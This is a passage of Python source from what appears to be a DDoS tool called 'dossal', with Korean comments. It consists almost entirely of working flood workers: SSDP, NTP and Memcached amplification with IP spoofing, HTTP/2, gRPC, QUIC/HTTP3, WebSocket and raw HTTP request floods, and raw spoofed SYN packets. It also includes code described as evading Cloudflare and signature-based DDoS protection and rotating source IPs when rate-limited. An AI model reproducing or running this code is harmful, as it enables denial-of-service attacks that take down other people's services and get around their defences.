    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 276  # avg ICMP packet size

# ── SSDP/UPnP flood: M-SEARCH flood (UDP 1900) ──────────────────
def _mp_ssdp_flood(args_tuple):
    """멀티프로세스 SSDP M-SEARCH 패킷: IoT/UPnP 타겟."""
    import time as _time
    import random as _rnd
    host, port, duration = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    
    # SSDP M-SEARCH requests
    st_types = ['ssdp:all', 'upnp:rootdevice', 'urn:schemas-upnp-org:device:basic:1',
                'urn:schemas-upnp-org:service:WANIPConnection:1',
                'urn:ietf:params:ssdp:v1']
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                st = _rnd.choice(st_types)
                mx = _rnd.randint(1, 30)
                ssdp_req = (f"M-SEARCH * HTTP/1.1\r\n"
                           f"HOST: 239.255.255.250:1900\r\n"
                           f"MAN: \"ssdp:discover\"\r\n"
                           f"MX: {mx}\r\n"
                           f"ST: {st}\r\n\r\n").encode()
                sock.sendto(ssdp_req, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def ssdp_worker(name, url, stats, duration, stop, payload_size=0):
    """SSDP/UPnP flood 워커: UDP M-SEARCH 폭주 (IoT 타격)"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_ssdp_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 150

# ── NTP amplification: mon_list (UDP 123) ───────────────────────
def _mp_ntp_flood(args_tuple):
    """멀티프로세스 NTP mon_list 패킷: 증폭 공격."""
    import time as _time
    import random as _rnd
    import struct as _struct
    host, port, duration, src_ip = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    if src_ip:
        try:
            sock.bind((src_ip, 0))
        except OSError:
            pass
    
    # NTP mon_list request: LI=3, VN=3, Mode=3, seq=0, stratum=0, poll=0, precision=0, root_delay=0, root_dispersion=0, ref_id=0
    ntp_header = _struct.pack('!BHHIIIII', 0b11011011, 0, 0, 0, 0, 0, 0, 0)
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                # NTP client: LI=3, VN=3, Mode=3 (client)
                ntp_req = _struct.pack('!BHHIIIII', 0b11011011, 0, 0, 0, 0, 0, 0, 0)
                sock.sendto(ntp_req, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def ntp_worker(name, url, stats, duration, stop, payload_size=0):
    """NTP amplification 워커: UDP NTP monlist 쿼리 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_ntp_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 48

# ── Memcached amplification: GET request (UDP 11211) ───────────
def _mp_memcached_flood(args_tuple):
    """멀티프로세스 Memcached GET 패킷: 증폭 공격."""
    import time as _time
    import random as _rnd
    host, port, duration, src_ip = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    if src_ip:
        try:
            sock.bind((src_ip, 0))
        except OSError:
            pass
    
    # Memcached GET request: "get key\r\n"
    keys = ['key1', 'key2', 'user:1001', 'session:abc', 'cache:item', 'data:xyz',
            'token:12345', 'config:main', 'stats:count', 'temp:tmp']
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                key = _rnd.choice(keys)
                memcached_req = f"get {key}\r\n".encode()
                sock.sendto(memcached_req, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def memcached_worker(name, url, stats, duration, stop, payload_size=0):
    """Memcached amplification 워커: UDP get 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_memcached_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 20

# ── H2 multiprocess: raw socket + h2 frames ─────────────────────
def _mp_h2_flood(args_tuple):
    """멀티프로세스 H2 전송 (1개 H2 연결, 배치 요청)"""
    import time as _time
    import ssl as _ssl
    import socket as _socket
    import random as _rnd
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    from h2.events import DataReceived
    host, port, path, duration, streams = args_tuple
    sent = 0
    errors = 0
    h2_429 = 0
    try:
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        raw.settimeout(5.0)
        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        raw.connect((host, port))
        ssock = ctx.wrap_socket(raw, server_hostname=host)
        
        # h2 connection
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        ssock.sendall(conn.data_to_send())
        # Wait for server SETTINGS
        try:
            data = ssock.recv(8192)
            conn.receive_data(data)
        except Exception:
            pass
        
        # Randomized headers
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/121.0',
        ]
        paths = [path, '/', '/index.html', '/api', '/static/app.js']
        
        end = _time.time() + duration
        while _time.time() < end:
            try:
                # Send a batch of concurrent streams
                for _ in range(min(streams, 100)):
                    stream_id = conn.get_next_available_stream_id()
                    headers = [
                        (':method', 'GET'),
                        (':scheme', 'https'),
                        (':authority', host),
                        (':path', _rnd.choice(paths)),
                        ('user-agent', _rnd.choice(uas)),
                        ('accept', 'text/html,*/*'),
                        ('sec-fetch-dest', 'document'),
                        ('sec-fetch-mode', 'navigate'),
                    ]
                    conn.send_headers(stream_id, headers, end_stream=True)
                data = conn.data_to_send()
                if data:
                    ssock.sendall(data)
                sent += min(streams, 100)
                # Drain responses
                deadline = _time.time() + 0.5
                while _time.time() < deadline:
                    try:
                        ssock.settimeout(0.05)
                        chunk = ssock.recv(65535)
                        if not chunk:
                            break
                        events = conn.receive_data(chunk)
                        for event in events:
                            if isinstance(event, DataReceived):
                                pass  # just drain
                    except _socket.timeout:
                        break
                    except Exception:
                        break
            except Exception:
                break
        ssock.close()
    except Exception:
        errors += 1
    return sent, errors, h2_429

async def h2mp_worker(name, url, stats, duration, stop, payload_size=1024):
    """HTTP/2 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 H2 연결"""
    host, port, path = parse_http(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    # Each process: 100 concurrent streams
    streams = 100
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration, streams)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_h2_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0, 0)] * n_procs
    for sent, errs, h429 in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

# ── gRPC worker: HTTP/2 + gRPC framing ──────────────────────────
def _mp_grpc_flood(args_tuple):
    """멀티프로세스 gRPC 패킷: 자식 프로세스에서 TLS + H2 + gRPC 프레임."""
    import time as _time
    import ssl as _ssl
    import socket as _socket
    host, port, path, duration, payload_size = args_tuple
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    from h2.events import DataReceived

    sent = 0
    errors = 0
    try:
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        raw.settimeout(5.0)
        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        raw.connect((host, port))
        ssock = ctx.wrap_socket(raw, server_hostname=host)
        
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        ssock.sendall(conn.data_to_send())
        # Read server preface
        data = ssock.recv(8192)
        conn.receive_data(data)
        
        headers = [
            (':method', 'POST'),
            (':scheme', 'https'),
            (':authority', host),
            (':path', path),
            ('content-type', 'application/grpc'),
            ('te', 'trailers'),
            ('user-agent', 'dossal/3.15'),
        ]
        grpc_payload = b'X' * max(1, payload_size)
        payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
        
        end = _time.time() + duration
        while _time.time() < end:
            try:
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.send_data(stream_id, payload, end_stream=True)
                data = conn.data_to_send()
                if data:
                    ssock.sendall(data)
                sent += 1
                # Drain responses
                try:
                    chunk = ssock.recv(65535)
                    if chunk:
                        conn.receive_data(chunk)
                except Exception:
                    pass
            except Exception:
                break
        ssock.close()
    except Exception:
        errors += 1
    return sent, errors

async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
    """gRPC 멀티프로세스 공격 워커"""
    host, port, path = parse_http(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_grpc_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for sent, errs in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
    """gRPC L7 공격 워커: HTTP/2 기반 gRPC 요청 폭주"""
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
        conn.receive_data(data)
    except Exception:
        pass
    
    # gRPC headers
    headers = [
        (':method', 'POST'),
        (':scheme', 'https'),
        (':authority', host),
        (':path', path),
        ('content-type', 'application/grpc'),
        ('te', 'trailers'),
        ('user-agent', f'dossal/{VERSION}'),
    ]
    # gRPC request frame: 1-byte flag + 4-byte length + payload
    grpc_payload = b'X' * max(1, payload_size)
    payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
    # Fire-and-forget: batch gRPC requests, drain in background
    reader_task = asyncio.create_task(_grpc_reader(conn, reader, stats))
    BATCH = 1
    error = None
    while not stop.is_set():
        try:
            for _ in range(BATCH):
                if stop.is_set():
                    break
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.send_data(stream_id, payload, end_stream=True)
            data = conn.data_to_send()
            if data:
                writer.write(data)
                await asyncio.wait_for(writer.drain(), timeout=5.0)
            stats.requests += BATCH
            stats.bytes += BATCH * len(payload)
        except Exception as e:
            stats.errors += 1
            error = e
            break
    reader_task.cancel()
    if writer.transport:
        writer.transport.abort()

async def _grpc_reader(conn, reader, stats):
    """백그라운드 리더: H2 프레임 배수 (연결 유지)."""
    try:
        while True:
            chunk = await reader.read(8192)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, DataReceived):
                    stats.bytes += len(event.data)
    except Exception:
        pass

# ── QUIC/HTTP3 worker: raw UDP with QUIC-like framing ───────────
def _mp_quic_send(args_tuple):
    """멀티프로세스 QUIC/UDP 패킷 전송"""
    host, port, duration, payload_size = args_tuple
    import time as _time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    payload = b'\xc0' + b'\x00' * 4 + b'\x00' * 8 + (b'X' * min(payload_size, 1200))
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
    """QUIC/UDP L4 공격 워커: 멀티프로세스 UDP 패킷 폭주"""
    host, port = parse_udp(url)
    n_procs = _UDP_NPROCS[0]
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_quic_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    plen = min(payload_size, 1200) + 13  # QUIC header + payload
    stats.packets += total
    stats.bytes += total * plen

def _mp_h3_send(args_tuple):
    """멀티프로세스 HTTP/3 전송 (QUIC Initial + H3 SETTINGS + GET)"""
    import socket as _socket
    import time as _time
    import os as _os
    import random as _rnd
    host, port, duration = args_tuple
    
    s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
    s.settimeout(1.0)
    
    # QUIC Initial packet header (long header, version 1)
    # First byte: 0xC3 (long header, v1, DCID len=8)
    # Version: 0x00000001 (QUIC v1)
    # DCID: 8 random bytes
    # SCID: 4 random bytes
    # Packet number: 4 bytes
    # Payload: H3 SETTINGS + GET frame
    
    # H3 SETTINGS frame (type 0x04, length, then settings)
    h3_settings = bytes([0x04, 0x00, 0x00]) + b'\x00' * 8  # minimal SETTINGS
    
    # H3 GET request (type 0x00 HEADERS frame)
    # Simplified: HEADERS frame with GET / HTTP/3
    h3_get = bytes([0x00, 0x0a]) + b'GET / HTTP/3\r\n\r\n'
    
    # Build QUIC Initial packet
    dcid = _os.urandom(8)
    scid = _os.urandom(4)
    pn = 0
    # Long header: form(1)+fixed(1)+type(1)+lkf(1) = 0xC3
    # Version: 0x00000001
    # DCID len(1) + DCID(8)
    # SCID len(1) + SCID(4)
    # Packet number len(1) + PN(4)
    quic_header = bytes([0xC3, 0x00, 0x00, 0x00, 0x01]) + bytes([8]) + dcid + bytes([4]) + scid
    payload = h3_settings + h3_get
    pkt = quic_header + bytes([4]) + _rnd.getrandbits(32).to_bytes(4, 'big') + payload
    
    end = _time.time() + duration
    sent = 0
    BATCH = 100
    while _time.time() < end:
        try:
            for _ in range(BATCH):
                # Randomize packet number
                pn_bytes = _rnd.getrandbits(32).to_bytes(4, 'big')
                pkt2 = pkt[:-len(payload)] + pn_bytes + payload
                s.sendto(pkt2, (host, port))
            sent += BATCH
        except Exception:
            break
    s.close()
    return sent

async def h3mp_worker(name, url, stats, duration, stop, payload_size=1400):
    """HTTP/3 (h3) 멀티프로세스 워커: QUIC Initial + H3 프레임 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_h3_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 100  # approx H3 packet size

# ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
def _random_http_req(host, path):
    """랜덤화 HTTP 요청 생성 (path/UA/headers 랜덤, 시그니처 DDoS 방어 우회)"""
    import random as _rnd
    # Random path variation: /, /index.html, /api/v1, /static/app.js, etc.
    paths = [path, '/', '/index.html', '/api', '/static/main.js', '/css/style.css',
             '/favicon.ico', '/health', '/status', '/api/v1/data', '/assets/app.abc123.js']
    rpath = _rnd.choice(paths)
    # Random query string
    qs = f"?_={_rnd.randint(100000,999999)}" if _rnd.random() < 0.5 else ""
    # Random User-Agent
    uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'dossal/' + VERSION,
    ]
    ua = _rnd.choice(uas)
    # Random Accept header
    accept = _rnd.choice([
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'application/json',
        'text/plain,*/*',
    ])
    # Random Accept-Language
    lang = _rnd.choice(['en-US,en;q=0.9', 'ko-KR,ko;q=0.9', 'ja-JP,ja;q=0.9', 'de-DE,de;q=0.9'])
    
    # Build request with random header order
    headers = {
        'Host': host,
        'User-Agent': ua,
        'Accept': accept,
        'Accept-Language': lang,
        'Connection': 'keep-alive',  # raw multiproc needs keep-alive
    }
    if _rnd.random() < 0.3:
        headers['Accept-Encoding'] = 'gzip, deflate, br'
    if _rnd.random() < 0.2:
        headers['Referer'] = f'http://{host}/'
    
    # Cloudflare bypass: sec-fetch-*, sec-ch-ua, consistent browser headers
    sec_ch_ua = _rnd.choice([
        '"Chromium";v="120", "Google Chrome";v="120", "Not_A Brand";v="24"',
        '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        '"Chromium";v="119", "Not?A_Brand";v="24"',
        '"Chromium";v="121", "Google Chrome";v="121"',
    ])
    headers['sec-ch-ua'] = sec_ch_ua
    headers['sec-ch-ua-mobile'] = '?0'
    headers['sec-ch-ua-platform'] = _rnd.choice(['"Windows"', '"macOS"', '"Linux"'])
    headers['Sec-Fetch-Dest'] = 'document'
    headers['Sec-Fetch-Mode'] = 'navigate'
    headers['Sec-Fetch-Site'] = _rnd.choice(['none', 'same-origin', 'cross-site'])
    headers['Sec-Fetch-User'] = '?1'
    # Upgrade-Insecure-Requests (browsers send this)
    if _rnd.random() < 0.6:
        headers['Upgrade-Insecure-Requests'] = '1'
    # Accept-Encoding (vary)
    headers['Accept-Encoding'] = _rnd.choice(['gzip, deflate, br', 'gzip, deflate', 'gzip'])
    # If-Modified-Since (cache-buster variation)
    if _rnd.random() < 0.3:
        import time as _t
        ts = _t.time() - _rnd.randint(3600, 86400)
        from email.utils import formatdate
        headers['If-Modified-Since'] = formatdate(timeval=ts, usegmt=True)
    
    # Random header order (browsers don't always send in same order)
    hkeys = list(headers.keys())
    _rnd.shuffle(hkeys)
    header_str = ''.join(f"{k}: {headers[k]}\r\n" for k in hkeys)
    req = f"GET {rpath}{qs} HTTP/1.1\r\n{header_str}\r\n"
    return req.encode()

def _mp_http_send(args_tuple):
    """멀티프로세스 raw socket HTTP 전송 (429 감지 + IP 교체 + 프록시)"""
    import time as _time
    if len(args_tuple) == 7:
        host, port, path, duration, src_ip, ip_pool, proxy = args_tuple
    else:
        host, port, path, duration, src_ip, ip_pool = args_tuple
        proxy = None
    # Pre-generate pool of 10 randomized requests (fast cycling)
    import random as _rnd
    req_pool = [_random_http_req(host, path) for _ in range(10)]
    req_idx = 0
    req_counter = 0
    REQ_REFRESH = 500  # Regenerate pool every 500 requests
    sent = 0
    errors = 0
    blocked = 0
    s = None
    cur_ip = src_ip
    end = _time.time() + duration
    while _time.time() < end:
        # Connect (or reconnect after 429/error)
        if s is None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5.0)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if cur_ip:
                    try:
                        s.bind((cur_ip, 0))
                    except OSError:
                        pass
                if proxy:
                    # Connect through proxy (HTTP CONNECT tunnel)
                    p_host, p_port = proxy
                    s.connect((p_host, p_port))
                    connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode()
                    s.sendall(connect_req)
                    resp = s.recv(4096)
                    if b'200' not in resp:
                        s.close()
                        errors += 1
                        break
                else:
                    s.connect((host, port))
            except Exception:
                errors += 1
                break
        try:
            # Cycle through pre-generated pool (fast)
            req_counter += 1
            if req_counter % REQ_REFRESH == 0:
                req_pool = [_random_http_req(host, path) for _ in range(10)]
                req_idx = 0
            else:
                req_idx = (req_idx + 1) % 10
            req = req_pool[req_idx]
            if _JITTER[0] > 0:
                import random as _rj
                _time.sleep(_rj.uniform(0, _JITTER[0]))
            s.sendall(req)
            data = s.recv(65535)
            if not data:
                break
            sent += 1
            # 429 detection: this IP is blocked, switch to next
            if _RECOVERY[0] and ip_pool and data[:12].startswith(b'HTTP/1.1 429'):
                if cur_ip:
                    _BLOCKED_IPS.add(cur_ip)
                    blocked += 1
                active = [ip for ip in ip_pool if ip not in _BLOCKED_IPS]
                if not active:
                    break
                cur_ip = active[0]
                s.close()
                s = None
        except Exception:
            break
    if s:
        try:
            s.close()
        except: pass
    return sent, errors, blocked, cur_ip

async def _wait_pool(pool, async_result, timeout):
    """multiprocessing pool 결과 대기 (executor 기반)"""
    loop = asyncio.get_event_loop()
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ded:
        try:
            results = await loop.run_in_executor(ded, async_result.get, timeout)
        except Exception:
            results = None
    pool.close()
    try:
        await loop.run_in_executor(None, pool.join)
    except Exception:
        pass
    return results

async def raw_worker(name, url, stats, duration, stop, payload_size=0):
    """Raw HTTP 멀티프로세스 워커: raw socket으로 최대 RPS"""
    host, port, path = parse_http(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    
    # Proxy (parsed once, passed to children)
    proxy = None
    if _PROXY[0]:
        try:
            from urllib.parse import urlparse as _up
            _pp = _up(_PROXY[0])
            proxy = (_pp.hostname, _pp.port or 8080)
        except Exception:
            proxy = None
    
    if _SPOOF_MODE[0] and _SRC_IPS[0]:
        # Spoofing + recovery mode: each process gets a different src IP
        ip_pool = list(_SRC_IPS[0])  # Pass full pool so recovery can pick next IP
        targets = []
        for i in range(n_procs):
            src_ip = _get_src_ip(i, n_procs)
            targets.append((host, port, path, duration, src_ip, ip_pool, proxy))
    else:
        targets = [(host, port, path, duration, None, None, proxy)] * n_procs
    
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_http_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0, 0, None)] * n_procs
    
    total_blocked = 0
    for r in results:
        if len(r) == 4:
            sent, errors, blocked, cur_ip = r
        else:
            sent, errors = r
            blocked = 0
        stats.requests += sent
        stats.errors += errors
        total_blocked += blocked
    stats.conns += n_procs
    if total_blocked > 0:
        print(f"[recovery] raw: {total_blocked} IPs blocked (429), {len(_BLOCKED_IPS)} total blocked", file=sys.stderr)

# ── WebSocket multiprocess: raw socket WS frame flood ────────────
def _mp_ws_flood(args_tuple):
    """멀티프로세스 WebSocket 패킷: 연결, 업그레이드, 프레임 전송."""
    import time as _time
    import struct as _struct
    import base64 as _b64
    import random as _rand
    host, port, path, duration, payload_size = args_tuple
    key = _b64.b64encode(_rand.randbytes(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
    msgs = 0
    errors = 0
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((host, port))
        s.sendall(req)
        # Read handshake response
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        if b"101" not in resp:
            errors += 1
            s.close()
            return 0, errors
        # Build WS frame (text, masked)
        payload = b"x" * max(1, payload_size)
        plen = len(payload)
        if plen < 126:
            frame_header = b"\x81" + _struct.pack("!B", 0x80 | plen)
        else:
            frame_header = b"\x81" + _struct.pack("!BH", 0x80 | 126, plen)
        mask = _rand.randbytes(4)
        masked_payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        frame = frame_header + mask + masked_payload
        frame_size = len(frame)
        # Send frames with periodic recv(discard) to keep TCP flow
        end = _time.time() + duration
        s.setblocking(False)
        import select as _select
        n = 0
        while _time.time() < end:
            try:
                # sendall in non-blocking mode: retry on BlockingIOError
                off = 0
                while off < frame_size:
                    try:
                        off += s.send(frame[off:])
                    except BlockingIOError:
                        # Wait for writable
                        _w, _, _ = _select.select([], [s], [], 0.01)
                        if not _w:
                            break
                if off >= frame_size:
                    msgs += 1
            except (BrokenPipeError, ConnectionResetError):
                break
            except Exception:
                break
            n += 1
            if n % 64 == 0:
                # Drain receive buffer
                try:
                    while True:
                        _r, _, _ = _select.select([s], [], [], 0)
                        if _r:
                            if not s.recv(4096):
                                break
                        else:
                            break
                except Exception:
                    break
        s.close()
    except Exception:
        errors += 1
    return msgs, errors

async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
    """WebSocket 멀티프로세스 워커: N개 프로세스, 각각 1개 WS 연결"""
    host, port, path = parse_ws(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_ws_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
        print(f"[wsm] pool timeout", file=sys.stderr)
    
    total_msgs = 0
    for msgs, errors in results:
        stats.ws_msgs += msgs
        stats.errors += errors
        total_msgs += msgs
    stats.conns += n_procs
    print(f"[wsm] {n_procs} procs, {total_msgs} msgs", file=sys.stderr)

# ── SYN flood: connect only, never read ──────────────────────────
def _mp_syn_flood(args_tuple):
    """멀티프로세스 SYN 패킷: 연결만 (SYN).
    Windows(관리자): raw socket + IP_HDRINCL로 진짜 SYN 스푸핑."""
    host, port, duration, src_ip = args_tuple
    import time as _time
    import errno as _errno
    import struct as _struct
    conns = 0
    errors = 0
    
    if _IS_WINDOWS and src_ip:
        # Windows: raw SYN with spoofed IP (no handshake, just fire SYN)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            
            src_bytes = socket.inet_aton(src_ip)
            dst_bytes = socket.inet_aton(host)
            # SYN packet: TCP header (20 bytes) with SYN flag (0x02)
            tcp_header = _struct.pack('!HHIIBBHHH',
                54321, port, 0, 0, 0x02, 0, 65535, 0, 0)  # sport, dport, seq, ack, offset=5, SYN, window, checksum, urg
            # IP header
            total_len = 20 + 20
            ip_header = _struct.pack('!BBHHHBBH4s4s',
                0x45, 0, total_len, 0, 0x4000, 64, 6, 0,  # TTL=64, DF flag
                src_bytes, dst_bytes)
            syn_packet = ip_header + tcp_header
            
            end = _time.time() + duration
            while _time.time() < end:
                n = 5000
                try:
                    for _ in range(n):
                        sock.sendto(syn_packet, (host, port))
                    conns += n
                except Exception:
                    break
            sock.close()
            return conns, errors
        except (OSError, PermissionError):
            pass
    
    # macOS/Linux: connect-based SYN (handshake)
    end = _time.time() + duration
    while _time.time() < end:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except (AttributeError, OSError):
                pass
            if src_ip:
                try:
                    s.bind((src_ip, 0))
                except OSError:
                    pass
            s.connect((host, port))
            conns += 1
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            if isinstance(e, OSError) and e.errno not in (
                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
                _errno.EAGAIN, _errno.ECONNRESET,
